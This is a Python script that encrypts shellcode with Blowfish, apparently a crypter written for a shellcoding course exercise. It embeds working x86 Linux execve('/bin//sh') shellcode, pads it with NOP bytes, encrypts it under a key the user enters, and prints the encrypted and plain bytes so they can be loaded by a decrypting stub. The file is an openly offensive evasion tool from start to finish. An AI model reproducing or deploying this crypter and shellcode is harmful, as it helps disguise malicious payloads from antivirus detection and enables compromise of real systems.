#!/usr/bin/env python3

import blowfish
import sys
import os

print("***********************************************************************************")
print("**********************  BLOWFISH SHELLCODE ENCRYPTER  *****************************")
print("")
print("*    Created By          :       Sandeep Singh Sethi                              *")
print("*    Purpose             :   Used to encrypt the shellcode with blowfish !        *")
print("")
print("**********************                                *****************************")
print("***********************************************************************************")
print()

shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"

crypted_shellcode = b""

byte_shellcode = bytearray(shellcode)

key = input("Enter the string to do the encryption of the shellcode :  \n")

if len(key) < 4 or len(key) > 56:
    print("Length of the key must be between 4 - 56 character , current key size doesn't met the requirements")
    sys.exit(1)

cipher = blowfish.Cipher(key.encode())

i = 8 - (len(byte_shellcode) % 8)

while i > 0:
    i -= 1
    byte_shellcode.append(144)      # 0x90

l = ((len(byte_shellcode)) / 8) + 1
i = 1
p = 0


while i < l:
    block = byte_shellcode[p:8*i]
    crypted_shellcode += cipher.encrypt_block(block)
    i += 1
    p += 8


uncrypted = ""

for x in bytearray(byte_shellcode):
    uncrypted += "\\x%02x" % x


crypted = ""

for x in bytearray(crypted_shellcode):
    crypted += "\\x%02x" % x


print("o-o" * 30)
print()
print("-" * 80)
print("Encrypted Shellcode : ")
print(crypted)
print()
print("-" * 80)
print("Unencrypted Shellcode : ")
print(uncrypted)
print()
print("-" * 80)
print("Encryption Key : ")
print(key)
print()
print("-" * 80)
print("Shellcode length after the padding : ",len(bytearray(crypted_shellcode)))
print("-" * 80)
print("o-o" * 30)
